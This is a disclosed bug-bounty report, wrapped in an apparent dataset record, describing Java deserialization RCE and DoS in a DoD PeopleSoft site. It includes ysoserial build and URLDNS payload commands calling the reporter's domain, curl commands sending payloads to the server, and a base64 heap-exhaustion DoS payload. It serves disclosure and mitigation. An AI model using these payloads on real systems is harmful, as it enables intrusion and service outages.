{
  "reported_to": "U.S. Dept Of Defense",
  "reported_by": "joaomatosf ",
  "title": "Remote Code Execution (RCE) in a DoD website",
  "content": "\nSUMMARY:\nThe DoD https://\u2588\u2588\u2588/psc/EXPROD/ Web System uses the Oracle PeopleSoft platform which is vulnerable to Remote Code Execution (RCE) and Denial of Service Attacks (DoS) over a Java Object Deserialization (CWE-502) in the \u201cmonitor\u201d service. Thus an attacker can generate and send malicious java objects of special types to your system and achieve arbitrary effects (such as RCE os DoS) during their deserialization (the objects are deserialized by readObject() method without any type of validation). This is related to CVE-2017-10366 [1].\nPROOF OF CONCEPT\nFor PoC I sent a special serialized java object in order to force the vulnerable server to perform a DNS Lookup for a domain controlled by me (dod.jexboss.info). In this way, if the code is executed successfully by the DoD server I will receive a DNS query from DoD and see it in the logs of my BIND daemon (the vulnerable DoD server will perform a local DNS query for dod.jexboss.info and the local DNS will try to query the authoritative nameserver for the jexboss.info domain (ns1.jexboss.info), which is mine).\nFor more details about this payload used, see [2].\nAttached is a video detailing the PoC.\nGenerating the payload: for generate the payload I used the tool ysoserial.\nCode 197 Bytes\n1$ git clone https://github.com/frohoff/ysoserial.git\n2$ cd ysoserial\n3$ mvn clean package \u2013DskipTests\n4$ cd target\n5$ java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://dod.jexboss.info > payload\nSending the payload to a vulnerable server:\ncurl https://\u2588\u2588\u2588\u2588\u2588/psc/EXPROD/ --data-binary@payload-k\nAfter sending the payload to the DoD server, the code was successfully executed and I received the DNS query on my BIND server, as can be seen in the log record below.\nBIND logs:\nCode 102 Bytes\n123-Mar-2018 18:29:54.523 queries: info: client \u2588\u2588\u2588#5691: query: dod.jexboss.info IN A -ED (10.0.1.202)\nDenial Of Service (DoS)\nThis vulnerability also allows denial of service attacks, but I can not perform this test because it puts the availability of your service at risk. If you want to validate this, use the following PoC:\nGenerating payload for Denial of Service (DoS)[3]:\nCode 188 Bytes\n1echo -n \"rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cH////d1cQB+AAB////3dXEAfgAAf///93VxAH4AAH////d1cQB+AAB////3dXEAfgAAf///93VxAH4AAH////d1cQB+AAB////3\" | base64 -d > payload_dos\nSending:\ncurl https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/psc/EXPROD/ --data-binary@payload_dos-k\nThis will make your service stop immediately and show the following error in the logs:\nException in thread \"Thread-2\" java.lang.OutOfMemoryError: Java heap space\nMITIGATION\nThe best way to mitigate deserialization vulnerabilities is by not deserializing data received from users. In this particular case, any requests from the internet to the path /monitor should be rejected/blocked!\nAlso, it is important to note that updating libraries used by attackers as Gadgets (such as commonsCollections) is not enough to protect against deserialization attacks, since new gadgets are discovered and published frequently. So, blocking the monitor service is best suited for this case!\nREFERENCES:\n[1] - CVE-2017-10366. Link: https://nvd.nist.gov/vuln/detail/CVE-2017-10366\n[2] - Triggering a DNS lookup using Java Deserialization. Link: https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/\n[3] - Java Deserialization DoS \u2013 payloads. Link: http://topolik-at-work.blogspot.com.br/2016/04/java-deserialization-dos-payloads.html\nBest Regards,\nJo\u00e3o Filho Matos Figueiredo, @joaomatosf\nImpact\nThis vulnerability allows:\n1) Remote Code Execution (RCE)\n2) Denial of Service (DoS)\n\n",
  "severity": [
    9.0,
    10.0
  ],
  "bounty": null,
  "weaknesses": [
    "Deserialization of Untrusted Data"
  ],
  "screenshots": {},
  "disclosed_date": 1570575000,
  "report_url": "https://hackerone.com/reports/329399",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "MEDIUM",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Clone the ysoserial tool from GitHub"
    ],
    [
      2,
      "Generate a payload using ysoserial with the URLDNS gadget targeting a domain controlled by the attacker"
    ],
    [
      3,
      "Send the payload to the vulnerable DoD server using curl"
    ],
    [
      4,
      "Monitor the attacker's BIND server for DNS queries to confirm execution"
    ]
  ],
  "vuln_description": "The vulnerability involves a Remote Code Execution (RCE) and Denial of Service (DoS) in a DoD website using Oracle PeopleSoft, due to insecure Java Object Deserialization in the 'monitor' service. An attacker can send malicious serialized Java objects to execute arbitrary code or cause a DoS.",
  "reason": "The attack requires knowledge of Java deserialization vulnerabilities, the use of specific tools (ysoserial), and understanding of how to craft and send payloads. However, the steps are well-documented and the tools are publicly available, making the attack reproducible with moderate expertise.",
  "new_complexity": "MEDIUM",
  "requires_code": false,
  "requires_CVE": true,
  "is_ctf": false,
  "other_report": null
}